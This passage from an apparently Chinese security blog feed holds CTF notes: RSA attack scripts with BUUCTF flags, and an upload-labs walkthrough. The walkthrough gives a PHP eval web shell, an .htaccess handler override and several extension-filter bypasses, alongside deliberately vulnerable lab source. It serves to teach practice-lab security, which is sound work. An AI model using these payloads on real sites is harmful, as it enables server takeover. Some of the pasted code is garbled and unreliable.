14058695417015334071588010346586749790539913287499707802938898719199384604316115908373997739604466972535533733290829894940306314501336291780396644520926473n = 33608051123287760315508423639768587307044110783252538766412788814888567164438282747809126528707329215122915093543085008547092423658991866313471837522758159d=wienerAttack(e,n)print(&quot;d=&quot;,d)</span></span><br></pre></td></tr></table></figure><h3 id="共模攻击（n，m相同，c，e不同）"><a href="#共模攻击（n，m相同，c，e不同）" class="headerlink" title="共模攻击（n，m相同，c，e不同）"></a>共模攻击（n，m相同，c，e不同）</h3><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210724173249.png"></p><p>生成秘钥的过程中使用了相同的模数n，此时用不同的秘钥e加密同一信息m即：</p><blockquote><p>c1 = m^e1 % n </p><p>c2 = m^e2 % n</p></blockquote><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert<span class="comment"># 欧几里得算法def egcd(a, b):  if a == 0:    return (b, 0, 1)  else:    g, y, x = egcd(b % a, a)    return (g, x - (b // a) * y, y)def main():  n =   c1 =   c2 =   e1 =   e2 =   s = egcd(e1, e2)  s1 = s[1]  s2 = s[2]  # 求模反元素  if s1&lt;0:    s1 = - s1    c1 = invert(c1, n)  elif s2&lt;0:    s2 = - s2    c2 = invert(c2, n)  m = pow(c1,s1,n)*pow(c2,s2,n) % n  print(m)if __name__ == &#x27;__main__&#x27;:  main()</span></span><br></pre></td></tr></table></figure><h3 id="e，m相同，存在两个n有公约数"><a href="#e，m相同，存在两个n有公约数" class="headerlink" title="e，m相同，存在两个n有公约数"></a>e，m相同，存在两个n有公约数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2from gmpy2 <span class="keyword">import</span> invert, irootimport gmpy2 <span class="keyword">as</span> gpfrom libnum <span class="keyword">import</span> xgcd, invmodn=[,,,,,,,,,,,,,,,,,,,]<span class="keyword">for</span> i <span class="keyword">in</span> n:    <span class="keyword">for</span> j <span class="keyword">in</span> n:        <span class="keyword">if</span> (i&lt;&gt;j):            pub_p=gmpy2.gcdext(i,j)            <span class="keyword">if</span> (pub_p[<span class="number">0</span>]&lt;&gt;<span class="number">1</span>)&amp;(i&gt;j):                <span class="built_in">print</span> i                <span class="built_in">print</span> j                <span class="built_in">print</span> pub_p[<span class="number">0</span>]                a=i,p=pub_p[<span class="number">0</span>]q=a/pp =  gp.mpz()q =  gp.mpz()e =  gp.mpz()c =  gp.mpz()n = p*qphi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)d = gp.invert(e, phi)m = <span class="built_in">pow</span>(c, d, n)<span class="built_in">print</span> <span class="built_in">hex</span>(m)</span><br></pre></td></tr></table></figure><h2 id="BUUCTF-RSA"><a href="#BUUCTF-RSA" class="headerlink" title="BUUCTF RSA"></a>BUUCTF RSA</h2><ul><li>题目如下，这题是超级无敌简单了</li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210723085132.png"></p><ul><li><p>我们根据rsa原理，e是公钥，d是私钥，并且d是e的反模数</p><p>计算公式如下：e * d ≡ 1 (mod φ)</p></li><li><p>写个python脚本</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2p=473398607161q=4511491e=17d=gmpy2.invert(e,(q-<span class="number">1</span>)*(p-<span class="number">1</span>))<span class="built_in">print</span> (d)</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210722161235.png"></p><p>得到flag{125631357777427553}</p><h2 id="BUUCTF-RSA3"><a href="#BUUCTF-RSA3" class="headerlink" title="BUUCTF RSA3"></a>BUUCTF RSA3</h2><ul><li>下载题目后仔细观察，发现有c1，有n，有c2，有e2，有e1，考虑共模攻击</li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210723084744.png"></p><ul><li><p>采用上面<strong>共模攻击</strong>的脚本</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210722165358.png"></p></li></ul><p>解出13040004482819947212936436796507286940525898188874967465457845309271472287032383337801279101</p><ul><li><p>十进制转十六进制，再将十六进制转文本即可</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210722165924.png"></p></li><li><p>将十六进制转为字符，得到flag</p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210722165941.png"></p><p>flag{49d91077a1abcb14f1a9d546c80be9ef}</p><h2 id="BUUCTF-RSA2"><a href="#BUUCTF-RSA2" class="headerlink" title="BUUCTF RSA2"></a>BUUCTF RSA2</h2><p>题目如下</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210724234710.png"></p><p>有dp，应该是dp泄露，用上面的脚本爆就完事了</p><p>如下图</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210724234922.png"></p><p>得到flag{wow_leaking_dp_breaks_rsa?_98924743502}</p><h2 id="BUUCTF-Dangerous-RSA"><a href="#BUUCTF-Dangerous-RSA" class="headerlink" title="BUUCTF Dangerous RSA"></a>BUUCTF Dangerous RSA</h2><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210724213705.png"></p><p>查看题目后发现e为3，是小指数明文攻击</p><p>所以采用脚本e=3小指数解密</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210724213951.png"></p><p>得到flag{25df8caf006ee5db94d48144c33b2c3b}</p><h2 id="BUUCTF-GUETCTF2019-BabyRSA"><a href="#BUUCTF-GUETCTF2019-BabyRSA" class="headerlink" title="BUUCTF [GUETCTF2019]BabyRSA"></a>BUUCTF [GUETCTF2019]BabyRSA</h2><p>题目如下</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210724214223.png"></p><p>观察题目给的条件，给了p+q，（p+1)(q+1)，e，d,以及密文C.<br>RSA的解密公式：M=C^d mod n<br>所以我们只要求出n即可。(n = pq)<br>n = (p+1)(q+1) - (p+q) - 1<br>即可解出明文m</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnuma = <span class="number">0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2eab</span> = <span class="number">0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740e</span> = <span class="number">0xe6b1bee47bd63f615c7d0a43c529d219d</span> = <span class="number">0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5c</span>= 0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9an = b-a-1m = <span class="built_in">pow</span>(c,d,n)<span class="built_in">print</span>(libnum.n2s(m))  <span class="comment">#（n2s将数值转化为字符串）</span></span><br></pre></td></tr></table></figure><p>如下图</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210724214454.png"></p><p>即可得到 flag{cc7490e-78ab-11e9-b422-8ba97e5da1fd}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 align = &quot;center&quot;&gt;RSA学习笔记&lt;/h1&gt;



&lt;h2 id=&quot;首先引用一张神图！不会就来看看&quot;&gt;&lt;a href=&quot;#首先引用一张神图！不会就来看看&quot; class=&quot;headerlink&quot; title=&quot;首先引用一张神图！不会就来看看&quot;&gt;&lt;/a&gt;首先引用</summary>
      
    
    
    
    <category term="-CTF" scheme="https://abinix.top/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>upload-labs笔记</title>
    <link href="https://abinix.top/2021/07/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://abinix.top/2021/07/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-07-30T16:00:19.000Z</published>
    <updated>2021-08-12T16:27:28.018Z</updated>
    
    <content type="html"><![CDATA[ <h1 align = "center">文件上传学习笔记</h1><h2 id="文件上传常用函数"><a href="#文件上传常用函数" class="headerlink" title="文件上传常用函数"></a>文件上传常用函数</h2><ul><li><p>file_exists() 函数检查文件或目录是否存在</p></li><li><p>deldot() 删除文件名末尾的点</p></li><li><p>strtolower( ) 将字符串转化为小写</p></li><li><p>str_ireplace() 替换函数，替换字符串中的一些字符</p><ul><li>通常格式为str_ireplace(“$1”,”$2”,”$3”），意思是将$3中的$1替换为$2</li></ul></li><li><p>unlink() 删除函数</p></li><li><p>trim（）函数移除文字字符的字体或其他预定义的字符（可以理解为去除空格等等）</p></li><li><p>strrchr() 查找字符串在另一个字符串中最后出现的位置，并返回到该位置后的所有字符</p><ul><li>例子：strrchr($x,’.’) 意思是查找 . 在变量x中最后一次出现的位置，假如$x为zhaobin.shuaishuai 那么这个函数的结果为shuaishuai</li></ul></li><li><p>strrpos() 函数查找字符串在另一中最后一次出现的位置（时间大小写）。</p><ul><li>和 strtchr()函数的区别就在于 它不返回到改位置</li></ul></li><li><p>move_uploaded_file() 把上传的文件移动到新的位置</p></li><li><p>getimagesize() 获取图像大小及相关信息</p></li><li><p>in_array() 用于搜索数组中是否存在指定的值，在文件上传中常用于过滤一些后缀名</p></li><li><p>unpack() 函数从二进制字符串对数据进行解包。</p></li><li><p>exif_imagetype() 判断一个图像的类型,读取一个图像的第一个字节并检查其签名</p></li></ul><h2 id="文件上传常见类型"><a href="#文件上传常见类型" class="headerlink" title="文件上传常见类型"></a>文件上传常见类型</h2><p>如下图，即常见类型，我们可以用upload-labs进行练习</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f54ecc934df.jpg"></p><h2 id="搭建upload-labs靶场"><a href="#搭建upload-labs靶场" class="headerlink" title="搭建upload-labs靶场"></a>搭建upload-labs靶场</h2><blockquote><p>docker search upload-labs </p><p>docker pull c0ny1/upload-labs</p><p>docker run -d -p 20001:80 c0ny1/upload-labs </p><p>docker exec -it (容器id) /bin/bash          //交互模式进入容器<br>mkdir upload                               //创建upload文件夹<br>chmod a+w upload                           //赋予读写权限</p></blockquote><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/7fd9b3c133ebcaa9.png"></p><h2 id="upload-labs-1-前端js校验"><a href="#upload-labs-1-前端js校验" class="headerlink" title="upload-labs 1(前端js校验)"></a>upload-labs 1(前端js校验)</h2><h3 id="方法1：用burpsuite里的功能，禁用js，"><a href="#方法1：用burpsuite里的功能，禁用js，" class="headerlink" title="方法1：用burpsuite里的功能，禁用js，"></a>方法1：用burpsuite里的功能，禁用js，</h3><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f42d3ea86cd.jpg"></p><h4 id="方法2：通过burp抓包改后缀进行绕过"><a href="#方法2：通过burp抓包改后缀进行绕过" class="headerlink" title="方法2：通过burp抓包改后缀进行绕过"></a>方法2：通过burp抓包改后缀进行绕过</h4><ol><li><p>事先先在txt中写入一句话木马 <code>&lt;?php eval($_POST[shell]);?&gt;</code>，然后把类型改为jpg，即运行上传的类型</p></li><li><p>打开burp，选择好jpg文件后上传，可以看到jpg下其实是隐藏的一句话木马</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/470d6f07ab63a290.png"></p></li><li><p>我们将文件类型改为php，来执行一句话木马，达到提权的效果，如下图已经上传成功了</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/5edd8648cac9afd8.png"></p></li><li><p>如图，url中就是我们上传图片的位置了，我们可以用蚁剑来连接</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/12d49b226fe8b896.png"></p></li><li><p>打开蚁剑，填入url和一句话中post的密码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/be7c971180f660f5.png"></p></li><li><p>如图，显示已经连接成功，说明提权成功了</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/deaebefad8b44800.png"></p></li></ol><h2 id="upload-labs-2（类型绕过）"><a href="#upload-labs-2（类型绕过）" class="headerlink" title="upload-labs 2（类型绕过）"></a>upload-labs 2（类型绕过）</h2><p>通过源码我们可以发现，这题较上题没有什么太大区别，重点是它<strong>判断了content-type的类型</strong>，</p><p>所以我们可以在抓包时更改类型为<strong>image/jpeg</strong></p><p>如下图，更改类型为image/jpeg即可</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f431d9105d0.jpg"></p><h2 id="upload-labs-3（黑名单）"><a href="#upload-labs-3（黑名单）" class="headerlink" title="upload-labs 3（黑名单）"></a>upload-labs 3（黑名单）</h2><h4 id="方法1：更换php文件名进行绕过"><a href="#方法1：更换php文件名进行绕过" class="headerlink" title="方法1：更换php文件名进行绕过"></a>方法1：更换php文件名进行绕过</h4><p>我们先看源代码，过滤了<code>.asp,.aspx,.php,.jsp</code>的后缀文件，但是我们知道能执行php代码的文件后缀不止一个，我们还可以用<code>.phtml .phps .php5 .pht</code>等后缀进行执行。</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f4337c50c9d.jpg"></p><p>解题方法一样，通过抓包改后缀为**.phtml**，然后绕过</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f4347c2ad30.jpg"></p><p>同样通过蚁剑连接成功，代表提权成功</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f432741959c.jpg"></p><h2 id="upload-labs-4（黑名单）"><a href="#upload-labs-4（黑名单）" class="headerlink" title="upload-labs 4（黑名单）"></a>upload-labs 4（黑名单）</h2><h3 id="方法1：改后缀"><a href="#方法1：改后缀" class="headerlink" title="方法1：改后缀"></a>方法1：改后缀</h3><p><strong>Apache解析漏洞</strong>：Apache会将不认识的后缀，如suibianxie.php.xxx.ccc、test.php.iii等<strong>从右向左解析</strong>，不认识就往左移一个，最终移到php时apache认识了就会将该文件当作php文件来解析。<strong>2.4.0-2.4.29</strong>中存在apache换行解析漏洞，在解析php时xxx.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><p>先上传一个带有一句话木马的jpg文件，然后将后缀改为 <strong>php.xxx</strong></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f444563f552.jpg"></p><p>可以看到上传成功，成功执行</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f444081b917.jpg"></p><h3 id="方法2：-htaccess绕过"><a href="#方法2：-htaccess绕过" class="headerlink" title="方法2：.htaccess绕过"></a>方法2：.htaccess绕过</h3><p>先看源码，几乎过滤了所有php代码执行的后缀名，但是还有一个没有过滤，那就是**.htaccess**</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f434d8d74ca.jpg"></p><h4 id="何为htaccess？"><a href="#何为htaccess？" class="headerlink" title="何为htaccess？"></a>何为htaccess？</h4><blockquote><p>.htaccess（超文本访问）是<a href="https://baike.baidu.com/item/Apache">Apache</a>服务器中的一个配置文件，它负责相关目录下的网页配置。</p><p>而在文件上传类型中，.htaccess可以将所有的文件当成php来解析</p></blockquote><p><strong>能执行htaccess的前提条件是：</strong></p><blockquote><p> 1.mod_rewrite模块开启。2.AllowOverride All</p></blockquote><p><strong>本题思路：</strong>我们先上传一个.htaccess的文件，然后再上传一个带有一句话木马的jpg文件，这样.htaccess就会将后来上传的图片转化为php代码执行，达到目的</p><ul><li><p>我们在txt中写入 <code>SetHandler application/x-httpd-php</code> ，</p><p>或者这么写入： （意思就是将”一句话.jpg“解析为php代码执行）</p><p><code>&lt;FilesMatch &quot;一句话.jpg&quot;&gt;</code><br><code>SetHandler application/x-httpd-php</code><br><code>&lt;/FilesMatch&gt;</code></p><p>并将类型改为.htaccess，并上传</p></li><li><p>然后上传带有一句话木马的图片，如下图，显示上传成功，可以直接连蚁剑了</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f44750e60c4.jpg"></p></li></ul><h2 id="upload-labs-5（大小写绕过）"><a href="#upload-labs-5（大小写绕过）" class="headerlink" title="upload-labs 5（大小写绕过）"></a>upload-labs 5（大小写绕过）</h2><p>首先看源码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f4ccae00cd8.jpg"></p><p>对比前面几关 我们可以看到这题放过了大小写的绕过  </p><p>去掉了 <code> $file_ext = strtolower($file_ext); //转换为小写</code>，所以我们可以通过大小写绕过</p><p>和前面套路一样，先上传一个一句话<strong>，然后在burp中改后缀为.PHP</strong></p><p>因为我的一句话中写的是 phpinfo() ,所以当上传成功时就会显示phpinfo</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f4cd48d9eb9.jpg"></p><h2 id="upload-labs-6（空格绕过-win特性）"><a href="#upload-labs-6（空格绕过-win特性）" class="headerlink" title="upload-labs 6（空格绕过,win特性）"></a>upload-labs 6（空格绕过,win特性）</h2><h3 id="方法1：-没有过滤php7，将后缀改为php7即可"><a href="#方法1：-没有过滤php7，将后缀改为php7即可" class="headerlink" title="方法1： 没有过滤php7，将后缀改为php7即可"></a>方法1： 没有过滤php7，将后缀改为php7即可</h3><p>先看源码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f4d0663e728.jpg"></p><p>我们可以发现这题没有针对空格进行过滤 缺少了 <code>$file_ext = trim($file_ext); *//首尾去空*</code></p><h3 id="方法2：在-php后面加空格进行绕过"><a href="#方法2：在-php后面加空格进行绕过" class="headerlink" title="方法2：在.php后面加空格进行绕过"></a>方法2：在.php后面加空格进行绕过</h3><p>这里我的环境好像出了点问题，没复现成功</p><h2 id="upload-labs-7（点绕过）"><a href="#upload-labs-7（点绕过）" class="headerlink" title="upload-labs 7（点绕过）"></a>upload-labs 7（点绕过）</h2><p>先看源码</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f4d2fd1e7cc.jpg"></p><p>我们发现这题 放过了点号，把语句<code>$file_name = deldot($file_name);*//删除文件名末尾的点*</code>去掉了</p><p>所以我们可以利用windows特性，会<strong>自动去掉后缀名中最后的”.”</strong>，可在后缀名中加”.”绕过：</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f4d3a4a03ae.jpg"></p><p>于是上传成功</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f4d3a56926c.jpg"></p><h2 id="upload-labs-8（-DATA绕过）"><a href="#upload-labs-8（-DATA绕过）" class="headerlink" title="upload-labs 8（::$DATA绕过）"></a>upload-labs 8（::$DATA绕过）</h2><p>看源码可以知道没有对**::$DATA**进行过滤 </p><p><code>$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);*//去除字符串::$DATA*</code></p><p>查找资料后可知在php+windows的环境下，会把::$DATA之后的数据当成文件流处理,不会检测后缀名，并且保留前面的文件名</p><p>所以我们在.php后加::$DATA即可</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f4d64224c93.jpg"></p><p>上传成功，显示phpinfo</p><h2 id="upload-labs-9（点空格点绕过）"><a href="#upload-labs-9（点空格点绕过）" class="headerlink" title="upload-labs 9（点空格点绕过）"></a>upload-labs 9（点空格点绕过）</h2><blockquote><p>原理：代码先是去除文件名前后的空格，再去除文件名最后所有的<code>.</code>，再通过<strong>strrchar</strong>函数来寻找<code>.</code>来确认文件名的后缀，但是最后保存文件的时候没有重命名而使用的原始的文件名，导致可以利用1.php. .（点+空格+点）来绕过</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="upload-labs-10（双写绕过）"><a href="#upload-labs-10（双写绕过）" class="headerlink" title="upload-labs 10（双写绕过）"></a>upload-labs 10（双写绕过）</h2><p>源码中着重看着一点  <code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p><p>理解一下便知 将黑名单里的后缀名<strong>替换为空且只替换一次</strong>，因此可以用双写绕过，大致意思就是当出现黑名单里的后缀时就将它转换为空,pphphp–&gt;php</p><p>所以pphphp和phphpp写法并不一样。</p><blockquote><p>pphphp解析后是 php</p><p>phphpp解析后是 hpp</p></blockquote><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f520dcac6e1.jpg"></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/60f4eba014ad6.jpg"></p><h2 id="upload-labs-11（00截断）"><a href="#upload-labs-11（00截断）" class="headerlink" title="upload-labs 11（00截断）"></a>upload-labs 11（00截断）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],strrpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 